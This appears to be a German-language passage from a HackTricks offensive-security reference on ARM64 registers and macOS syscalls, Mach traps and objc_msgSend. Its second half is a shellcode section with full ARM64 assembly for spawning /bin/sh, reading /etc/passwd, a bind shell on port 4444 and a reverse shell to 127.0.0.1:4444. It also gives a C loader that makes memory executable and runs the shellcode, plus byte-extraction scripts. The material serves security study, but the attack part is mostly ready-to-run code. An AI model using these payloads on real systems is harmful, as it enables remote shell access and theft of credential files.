- Execution State Registers: Verhalten des Prozesses (vom OS verwaltet).

#### Application Program Status Register (APSR)

- Die Flags **`N`**, **`Z`**, **`C`**, **`V`** (wie in AArch64)
- Das **`Q`**-Flag: Es wird auf 1 gesetzt, sobald während der Ausführung einer spezialisierten Saturating-Arithmetic-Instruktion eine **integer saturation** auftritt. Sobald es auf **`1`** gesetzt wurde, behält es diesen Wert bei, bis es manuell auf 0 gesetzt wird. Außerdem gibt es keine Instruktion, die seinen Wert implizit prüft; dies muss durch manuelles Auslesen geschehen.
- **`GE`**-Flags (Greater than or equal): Sie werden in SIMD- (Single Instruction, Multiple Data-)Operationen verwendet, etwa bei „parallel add“ und „parallel subtract“. Diese Operationen ermöglichen die Verarbeitung mehrerer Datenpunkte in einer einzelnen Instruktion.

Beispielsweise **addiert** die Instruktion **`UADD8`** **vier Byte-Paare** (aus zwei 32-Bit-Operanden) parallel und speichert die Ergebnisse in einem 32-Bit-Register. Anschließend **setzt sie die `GE`-Flags im `APSR`** basierend auf diesen Ergebnissen. Jedes GE-Flag entspricht einer der Byte-Additionen und zeigt an, ob die Addition für dieses Byte-Paar **übergelaufen ist**.

Die Instruktion **`SEL`** verwendet diese GE-Flags, um bedingte Aktionen auszuführen.

#### Execution State Registers

- Die Bits **`J`** und **`T`**: **`J`** sollte 0 sein. Wenn **`T`** 0 ist, wird das Instruction Set A32 verwendet, und wenn es 1 ist, wird T32 verwendet.
- **IT Block State Register** (`ITSTATE`): Dies sind die Bits 10-15 und 25-26. Sie speichern Bedingungen für Instruktionen innerhalb einer mit **`IT`** prefix versehenen Gruppe.
- **`E`**-Bit: Gibt die **Endianness** an.
- **Mode and Exception Mask Bits** (0-4): Sie bestimmen den aktuellen Execution State. Das 5. Bit gibt an, ob das Programm als 32-Bit-Programm (1) oder als 64-Bit-Programm (0) ausgeführt wird. Die anderen 4 Bits repräsentieren den aktuell verwendeten **Exception Mode** (wenn eine Exception auftritt und behandelt wird). Der gesetzte Wert **gibt die aktuelle Priorität an**, falls während der Behandlung eine weitere Exception ausgelöst wird.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Bestimmte Exceptions können mithilfe der Bits **`A`**, `I`, `F` deaktiviert werden. Wenn **`A`** 1 ist, bedeutet dies, dass **asynchronous aborts** ausgelöst werden. **`I`** konfiguriert die Reaktion auf externe Hardware-**Interrupt Requests** (IRQs), und **`F`** bezieht sich auf **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Siehe [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) oder führe `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` aus. BSD syscalls haben **x16 > 0**.

### Mach Traps

Siehe in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) die `mach_trap_table` und in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) die Prototypen. Die maximale Anzahl von Mach Traps ist `MACH_TRAP_TABLE_COUNT` = 128. Mach Traps haben **x16 < 0**. Daher müssen die Nummern aus der vorherigen Liste mit einem **Minuszeichen** aufgerufen werden: **`_kernelrpc_mach_vm_allocate_trap`** ist **`-10`**.

Du kannst auch **`libsystem_kernel.dylib`** in einem Disassembler überprüfen, um herauszufinden, wie diese (und BSD) syscalls aufgerufen werden:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Beachte, dass **Ida** und **Ghidra** auch **spezifische dylibs** aus dem Cache dekompilieren können, indem einfach der Cache übergeben wird.

> [!TIP]
> Manchmal ist es einfacher, den **dekompilierten** Code aus **`libsystem_kernel.dylib`** zu prüfen, **als** den **Quellcode**, da der Code mehrerer Syscalls (BSD und Mach) über Scripts generiert wird (siehe Kommentare im Quellcode), während man in der dylib sehen kann, was tatsächlich aufgerufen wird.

### machdep calls

XNU unterstützt eine weitere Art von Aufrufen, die als machine dependent bezeichnet werden. Die Nummern dieser Aufrufe hängen von der Architektur ab, und weder die Aufrufe noch die Nummern müssen dauerhaft konstant bleiben.

### comm page

Dies ist eine dem Kernel gehörende Speicherseite, die in den Adressraum jedes User-Prozesses eingeblendet wird. Sie soll den Übergang vom User Mode in den Kernel Space schneller machen, als dies über Syscalls möglich wäre, da dieser Übergang bei Kernel-Services, die so häufig verwendet werden, sehr ineffizient wäre.

Beispielsweise liest der Aufruf `gettimeofdate` den Wert von `timeval` direkt aus der comm page.

### objc_msgSend

Diese Funktion wird in Objective-C- oder Swift-Programmen sehr häufig verwendet. Sie ermöglicht den Aufruf einer Methode eines Objective-C-Objekts.

Parameter ([mehr Informationen in der Dokumentation](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Zeiger auf die Instanz
- x1: op -> Selector der Methode
- x2... -> Verbleibende Argumente der aufgerufenen Methode

Wenn du also vor dem Branch zu dieser Funktion einen Breakpoint setzt, kannst du in lldb einfach herausfinden, was aufgerufen wird (in diesem Beispiel ruft das Objekt ein Objekt aus `NSConcreteTask` auf, das einen Befehl ausführt):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Durch das Setzen der Umgebungsvariable **`NSObjCMessageLoggingEnabled=1`** ist es möglich, in einer Datei wie `/tmp/msgSends-pid` zu protokollieren, wann diese Funktion aufgerufen wird.
>
> Wenn außerdem **`OBJC_HELP=1`** gesetzt und eine beliebige Binary aufgerufen wird, werden weitere Umgebungsvariablen angezeigt, mit denen sich protokollieren lässt, wann bestimmte Objc-C-Aktionen auftreten.

Wenn diese Funktion aufgerufen wird, muss die aufgerufene Methode der angegebenen Instanz gefunden werden. Dafür werden verschiedene Suchen durchgeführt:

- Optimistische Cache-Suche durchführen:
- Bei Erfolg: fertig
- runtimeLock erwerben (Lesen)
- Wenn (realize && !cls->realized): Klasse realisieren
- Wenn (initialize && !cls->initialized): Klasse initialisieren
- Eigenen Cache der Klasse durchsuchen:
- Bei Erfolg: fertig
- Methodenliste der Klasse durchsuchen:
- Wenn gefunden, Cache füllen und fertig
- Cache der Oberklasse durchsuchen:
- Bei Erfolg: fertig
- Methodenliste der Oberklasse durchsuchen:
- Wenn gefunden, Cache füllen und fertig
- Wenn (resolver): method resolver ausprobieren und die Klassensuche wiederholen
- Wenn weiterhin hier (= alles andere ist fehlgeschlagen): forwarder ausprobieren

### Shellcodes

Zum Kompilieren:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Um die Bytes zu extrahieren:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Für neuere macOS-Versionen:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-Code zum Testen des shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Übernommen von [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Mit cat lesen

Das Ziel ist, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, daher ist das zweite Argument (x1) ein Array von Parametern (was im Speicher einem Stack aus Adressen entspricht).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Befehl mit sh aus einem Fork aufrufen, damit der Hauptprozess nicht beendet wird
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell von [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) auf **Port 4444**<sup>[2]</sup>
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Von [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell zu **127.0.0.1:4444**<sup>[3]</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referenzen

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
